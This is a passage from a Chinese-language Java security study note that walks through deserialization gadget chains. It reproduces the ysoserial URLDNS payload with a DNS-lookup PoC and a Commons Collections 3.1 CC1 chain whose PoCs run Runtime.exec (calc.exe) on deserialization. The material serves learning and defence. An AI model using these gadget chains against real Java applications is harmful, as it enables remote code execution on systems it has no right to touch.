            FileOutputStream fileOut = new FileOutputStream("person.ser");
            ObjectOutputStream out = new ObjectOutputStream(fileOut);
            out.writeObject(person);
            out.close();
            fileOut.close();
            System.out.println("Serialized data is saved in person.ser");
        } catch (IOException e) {
            e.printStackTrace();
        }

        // 反序列化对象
        Person deserializedPerson = null;
        try {
            FileInputStream fileIn = new FileInputStream("person.ser");
            ObjectInputStream in = new ObjectInputStream(fileIn);
            deserializedPerson = (Person) in.readObject();
            in.close();
            fileIn.close();
        } catch (IOException | ClassNotFoundException e) {
            e.printStackTrace();
        }

        if (deserializedPerson != null) {
            System.out.println("Deserialized data:");
            System.out.println("Name: " + deserializedPerson.getName());
            System.out.println("Age: " + deserializedPerson.getAge());
        }
    }
}

```

#### URLDNS调用链

[ysoserial/src/main/java/ysoserial/payloads/URLDNS.java at master · frohoff/ysoserial (github.com)](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java)

```Java
package ysoserial.payloads;

import java.io.IOException;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;


/**
 * A blog post with more details about this gadget chain is at the url below:
 *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
 *
 *   This was inspired by  Philippe Arteau @h3xstream, who wrote a blog
 *   posting describing how he modified the Java Commons Collections gadget
 *   in ysoserial to open a URL. This takes the same idea, but eliminates
 *   the dependency on Commons Collections and does a DNS lookup with just
 *   standard JDK classes.
 *
 *   The Java URL class has an interesting property on its equals and
 *   hashCode methods. The URL class will, as a side effect, do a DNS lookup
 *   during a comparison (either equals or hashCode).
 *
 *   As part of deserialization, HashMap calls hashCode on each key that it
 *   deserializes, so using a Java URL object as a serialized key allows
 *   it to trigger a DNS lookup.
 *
 *   Gadget Chain:
 *     HashMap.readObject()
 *       HashMap.putVal()
 *         HashMap.hash()
 *           URL.hashCode()
 *
 *
 */
@SuppressWarnings({ "rawtypes", "unchecked" })
@PayloadTest(skip = "true")
@Dependencies()
@Authors({ Authors.GEBL })
public class URLDNS implements ObjectPayload<Object> {

        public Object getObject(final String url) throws Exception {

                //Avoid DNS resolution during payload creation
                //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
                URLStreamHandler handler = new SilentURLStreamHandler();

                HashMap ht = new HashMap(); // HashMap that will contain the URL
                URL u = new URL(null, url, handler); // URL to use as the Key
                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

                Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

                return ht;
        }

        public static void main(final String[] args) throws Exception {
                PayloadRunner.run(URLDNS.class, args);
        }

        /**
         * <p>This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
         * using the serialized object.</p>
         *
         * <b>Potential false negative:</b>
         * <p>If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
         * second resolution.</p>
         */
        static class SilentURLStreamHandler extends URLStreamHandler {

                protected URLConnection openConnection(URL u) throws IOException {
                        return null;
                }

                protected synchronized InetAddress getHostAddress(URL u) {
                        return null;
                }
        }
}
```

先看`HashMap`的`readObject`方法，下面调用了`hash`方法，传入了`key`参数
![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20231101145008714.png)

>`readObject()`方法首先调用`s.defaultReadObject()`来读取默认的序列化字段。然后调用`reinitialize()`方法来重新初始化HashMap对象。
>
>接下来，代码读取和忽略了一些字段，如阈值、负载因子、桶的数量等。
>
>然后，代码读取并解析了HashMap中的键值对的数量，并根据读取到的数量和负载因子计算出了HashMap的容量和阈值。
>
>接着，代码使用`SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap)`来检查数组的类型和长度是否合法。
>
>然后，代码创建了一个新的Node数组作为HashMap的存储结构，并将其赋值给`table`字段。
>
>最后，代码使用循环读取键值对，并通过调用`putVal()`方法将键值对放入HashMap中。
>
>需要注意的是，这段代码是HashMap类的内部实现细节，用于在反序列化时恢复HashMap对象的状态。正常情况下，我们不需要直接调用这个方法，而是通过使用`ObjectInputStream`的`readObject()`方法来自动调用。
>
>这个示例代码展示了如何在自定义的`readObject()`方法中完成HashMap的反序列化过程，并恢复HashMap对象的状态。

`hash`方法里面调用了`key`的`hashCode()`方法
![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20231101145303743.png)


而`URL`类的`hashCode`方法会调用到`URLStreamHandler`类的`hashCode`方法
![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20231101145559503.png)


`URLStreamHandler`类的`hashCode`方法会调用`getHostAddress`方法，该方法会获取本地主机的IP地址。如果主机字段为空或DNS解析失败，将返回null。
![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20231101145845836.png)

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20231101150014925.png)

所以，将`URL`类当做`HashMap`的`key`，让其进入`readObject`后调用`hash`方法传入`URL`，然后通过调用`URL`的`HashCode`到`URLStreamHandler`类的`hashCode`方法，最后调用`getHostAddress`方法。

poc

```java
package org.example;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;

public class urldns {
    public static void main(String[] args) throws IOException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException {
//        urlPoc uu = new urlPoc("https://25693.5M7O9BPTY2.dns.xms.la");
//        uu.serUrlDns();
        urlPoc.unserUrlDns();
    }
}
class urlPoc {
    private URL url;
    private HashMap map;

    public urlPoc(String u) throws NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, MalformedURLException, NoSuchFieldException {
        Class mapClass = HashMap.class;
        this.map = (HashMap)mapClass.getConstructor().newInstance();

        this.url = new URL(u);

        map.put(url, "1");

        Field hashcode = url.getClass().getDeclaredField("hashCode");
        hashcode.setAccessible(true);
        hashcode.set(url, -1);
    }

    public void serUrlDns() throws IOException {
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("urldns.ser"));
        out.writeObject(this.map);
    }

    public static void unserUrlDns() throws IOException, ClassNotFoundException {
        ObjectInputStream in = new ObjectInputStream(new FileInputStream("urldns.ser"));
        HashMap hashmap = (HashMap) in.readObject();
        System.out.println("unser urldns");
    }
}
```

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20231106200108684.png)

#### cc1

先分析一个Java安全漫谈中最简单的cc链

maven添加依赖

```xml
    <dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
    </dependencies>
```

poc

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.util.HashMap;
import java.util.Map;

public class cc01 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer(
                        "exec", 
                        new Class[]{String.class}, 
                        new Object[]{"C:\\WINDOWS\\system32\\calc.exe"}
                ),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        outerMap.put("test", "xxxx");
    }
}
```

`Transformer`是一个接口，`TransformedMap`在转换Map的新元素时，就会调⽤`transform`⽅法
![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20231107150708714.png)

`ConstantTransformer`是接口`Transformer`的实现类，在构造函数的时候传入一个实例，在调用`transform`方法时将其返回
![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20231107150832842.png)

`InvokerTransformer`是接口`Transformer`的实现类，在构造函数的时候传进来方法名称、参数类型和参数，在调⽤`transform`⽅法时传入对象`input`，然后调用`input`的对应的方法。
![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20231107151124522.png)

`ChainedTransformer`能够将一个`Transformer`数组连成串，挨个调用其中的`transform`方法
![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20231107153557268.png)

`TransformedMap` 可以用于在将值放入或获取值出来时，对其进行转换，对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可以执⾏⼀个回调。

```Java
Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
// outerMap就是修饰过后的map，innerMap就是要进行修饰的map，第二个参数是对key进行修饰的Transformers，第三个参数是对value进行修饰的Transformers。
```

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20231107154433255.png)

这样触发命令执行的地方就很明显了，当向`outerMap`里添加元素的时候，会调用`Transformer`数组里的方法，也就是调用`Runtime`的`exec`方法执行命令，将其进行反序列化后会报错，因为`Runtime`没法进行序列化，所以需要用到反射来进行序列化。

poc

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.util.HashMap;
import java.util.Map;

public class cc01 {
    public static void main(String[] args) throws Exception {
//        Runtime demo =(Runtime) Runtime.class.getMethod("getRuntime").invoke(null);
//        sercc01();
        unsercc01();
    }
    
    public static void sercc01() throws IOException {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{
                                String.class,
                                Class[].class
                        },
                        new Object[]{
                                "getRuntime",
                                null
                        }
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[] {
                                Object.class,
                                Object[].class
                        },
                        new Object[] {
                                null,
                                null
                        }
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"C:\\WINDOWS\\system32\\calc.exe"}
                ),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        // outerMap就是修饰过后的map，innerMap就是要进行修饰的map
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("./serDemo/cc01.ser"));
        out.writeObject(outerMap);
    }

    public static void unsercc01() throws IOException, ClassNotFoundException {
            ObjectInputStream in = new ObjectInputStream(new FileInputStream("./serDemo/cc01.ser"));
            Map hashmap = (Map) in.readObject();
            hashmap.put("test", "xxxx");
            System.out.println("unser cc01");
    }

}
```